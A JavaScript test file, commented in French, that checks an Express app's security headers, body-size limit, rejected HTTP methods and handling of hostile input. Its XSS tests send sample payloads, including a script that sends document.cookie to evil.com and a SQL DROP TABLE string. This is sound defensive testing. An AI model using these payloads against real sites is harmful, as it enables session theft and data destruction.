import request from 'supertest'
import app from '../app.js'

describe('Sécurité — Headers HTTP (Helmet)', () => {
  it('ajoute X-Content-Type-Options', async () => {
    const res = await request(app).get('/api/health')
    expect(res.headers['x-content-type-options']).toBe('nosniff')
  })

  it('ajoute X-Frame-Options', async () => {
    const res = await request(app).get('/api/health')
    expect(res.headers['x-frame-options']).toBeDefined()
  })

  it('n\'expose pas X-Powered-By', async () => {
    const res = await request(app).get('/api/health')
    expect(res.headers['x-powered-by']).toBeUndefined()
  })
})

describe('Sécurité — Taille du body', () => {
  it('rejette un payload JSON supérieur à 20kb', async () => {
    // Génère un message de ~25kb
    const bigMessage = 'A'.repeat(25_000)
    const res = await request(app)
      .post('/api/contact')
      .set('Content-Type', 'application/json')
      .send(JSON.stringify({ name: 'Test', email: 'test@test.com', message: bigMessage }))
    expect(res.status).toBe(413)
  })
})

describe('Sécurité — Sanitisation XSS', () => {
  it('ne plante pas avec un payload XSS dans le contact', async () => {
    const payloads = [
      '<script>alert(document.cookie)</script>',
      '"><img src=x onerror=alert(1)>',
      "'; DROP TABLE contacts; --",
      '{{7*7}}',  // Template injection
      '\x00\x01\x02',  // Null bytes
    ]

    for (const payload of payloads) {
      const res = await request(app).post('/api/contact').send({
        name: payload,
        email: 'test@example.com',
        message: `Message test avec payload: ${payload} et du contenu suffisant.`,
      })
      // Ne doit jamais planter (500) — sanitisé (200) ou rejeté (400)
      expect(res.status).not.toBe(500)
    }
  })

  it('ne plante pas avec un payload XSS dans le chat', async () => {
    const res = await request(app).post('/api/chat').send({
      messages: [
        { role: 'user', content: '<script>fetch("https://evil.com?c="+document.cookie)</script>Aide-moi.' },
      ],
    })
    // Ne doit pas planter (peut échouer sur Groq si clé non configurée = 502)
    expect(res.status).not.toBe(500)
  })
})

describe('Sécurité — Méthodes HTTP non autorisées', () => {
  it('rejette PUT sur /api/chat', async () => {
    const res = await request(app).put('/api/chat').send({})
    expect(res.status).toBe(404)
  })

  it('rejette DELETE sur /api/contact', async () => {
    const res = await request(app).delete('/api/contact')
    expect(res.status).toBe(404)
  })

  it('rejette PATCH sur /api/health', async () => {
    const res = await request(app).patch('/api/health')
    expect(res.status).toBe(404)
  })
})

describe('Sécurité — Content-Type', () => {
  it('retourne du JSON avec le bon Content-Type', async () => {
    const res = await request(app).get('/api/health')
    expect(res.headers['content-type']).toMatch(/application\/json/)
  })
})
